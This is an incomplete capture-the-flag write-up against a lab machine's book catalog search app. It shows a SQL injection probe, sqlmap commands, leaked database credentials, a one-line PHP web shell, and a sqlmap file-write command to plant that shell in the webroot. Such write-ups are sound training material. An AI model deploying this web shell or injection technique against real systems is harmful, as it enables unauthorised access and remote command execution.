Target: Machine 014000A2
Target IP: 10.129.176.71
Status: Incomplete

Step 1: Web Application Discovery

I visited [http://10.129.176.71/]. It was a book catalog search application.

I captured a search request in Burp Suite. POST /getbooks.php with parameter search.

I tested it out with a SQL payload (search=test' select * from users;). This lead to a unhandled PHP runtime warning.

This meant that there was a presence of SQL injection into raw query.

Step 2: Automated SQL Injection

I executed sqlmap against the POST parameter search
sqlmap -u http://10.129.176.71/getbooks.php --data "search=a"

<img width="468" height="297" alt="image" src="https://github.com/user-attachments/assets/ddcd7893-b71f-4748-ac4c-f9f1f3999e19" />

I obtained a getbooks.php. This revealed internal database credentials like user root, password password and database is libary.

Step 3: File Upload with SQL Injection

I created a PHP web shell named shell.php

<?php system($_GET["cmd"]); ?>

I used sqlmap's --file-write and --file-dest switches to deploy the file into a writable directory under webroot

sqlmap -u http://10.129.176.71/getbooks.php \
  --data "search=a" \
  --file-write shell.php \
  --file-dest="/xampp/htdocs/orders/shell.php"

 When attempting to curl the shell.php I got errors

 <img width="468" height="294" alt="image" src="https://github.com/user-attachments/assets/9f4b991a-2ce2-4cff-8683-ef5979ed58d5" />

Unfortunately I was unable to finish this CTF.
